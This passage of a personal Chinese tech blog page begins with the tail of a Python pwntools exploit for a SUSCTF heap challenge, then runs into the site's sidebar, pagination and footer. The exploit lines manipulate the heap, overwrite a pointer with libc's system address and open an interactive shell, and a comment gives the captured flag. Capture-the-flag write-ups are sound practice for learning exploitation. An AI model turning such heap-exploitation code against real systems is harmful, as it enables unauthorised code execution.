class="line">    add_tree(<span class="number">0x2c0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    del_tree(<span class="number">0xf0</span>+<span class="number">8</span>*<span class="number">0x100</span>)</span><br><span class="line">    add_tree(<span class="number">0x3c0</span>,p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    del_tree(<span class="number">0xf0</span>+<span class="number">9</span>*<span class="number">0x100</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br><span class="line"><span class="comment">#SUSCTF&#123;We_4re_pl4ying_unDer_th3_tRee&#125;</span></span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">rootzhang</p>
  <div class="site-description" itemprop="description">我的博客</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">30</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rootzhang</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
